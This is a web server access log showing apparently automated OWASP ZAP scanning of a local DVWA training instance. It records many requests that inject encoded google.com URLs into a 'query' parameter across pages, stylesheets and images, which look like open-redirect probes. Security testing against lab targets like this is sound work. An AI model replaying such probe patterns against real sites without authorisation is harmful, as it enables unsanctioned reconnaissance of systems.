172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=www.google.com%3A80%2F HTTP/1.1" 301 578 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=www.google.com%3A80%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=www.google.com HTTP/1.1" 301 562 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=www.google.com HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 620 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /dvwa/?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /docs/DVWA_v1.3.pdf?query=www.google.com%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /docs/DVWA_v1.3.pdf?query=www.google.com%3A80%2F HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /docs/DVWA_v1.3.pdf?query=www.google.com HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 301 612 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 654 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 664 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=www.google.com%2F HTTP/1.1" 301 576 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=www.google.com%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=www.google.com%3A80%2F HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=www.google.com%3A80%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=www.google.com HTTP/1.1" 301 570 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=www.google.com HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 628 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 638 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /docs/DVWA_v1.3.pdf?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /docs/DVWA_v1.3.pdf?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=www.google.com%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=www.google.com%3A80%2F HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=www.google.com HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=www.google.com%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=www.google.com%3A80%2F HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/login.css?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=www.google.com HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/css/main.css?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 301 608 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 660 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 670 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=www.google.com%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=www.google.com%2F HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=www.google.com%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=www.google.com%3A80%2F HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=www.google.com%3A80%2F HTTP/1.1" 301 592 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=www.google.com%3A80%2F HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=www.google.com HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=www.google.com HTTP/1.1" 301 576 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=www.google.com HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 634 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/login_logo.png?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 644 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=www.google.com%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
